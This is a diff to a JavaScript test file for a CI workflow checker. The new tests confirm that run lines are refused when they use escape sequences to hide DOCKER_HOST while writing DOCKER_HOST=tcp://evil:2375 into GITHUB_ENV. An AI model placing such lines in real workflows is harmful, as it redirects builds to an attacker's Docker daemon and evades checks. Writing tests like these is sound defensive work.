@@ -139,3 +139,15 @@ test("the run-command parser accepts ordinary commands that only look like build
 test("the run-command parser refuses builds, builder and endpoint switches and unchecked Compose files", () => {
   for (const line of RUN_LINES_THAT_ARE_REFUSED) assert.ok(runCheck(line).length > 0, line);
 });
+
+const ESCAPED_ENV = [
+  "printf 'DOCKER_\\x48OST=tcp://evil:2375\\n' >> \"$GITHUB_ENV\"",
+  "echo -e 'DOCKER_\\x48OST=tcp://evil:2375' >> \"$GITHUB_ENV\"",
+  "printf 'DOCKER_\\110OST=tcp://evil:2375\\n' >> \"$GITHUB_ENV\"",
+  "printf 'DOCKER_\\u0048OST=tcp://evil:2375\\n' >> \"$GITHUB_ENV\"",
+];
+for (const run of ESCAPED_ENV) {
+  test(`an escaped Docker env name is refused: ${run.slice(0, 40)}`, () => {
+    assert.match(buildChecks("ci", withStep("ci", "web", { run })).join(), /DOCKER_HOST selects a builder or changes the Docker client/);
+  });
+}
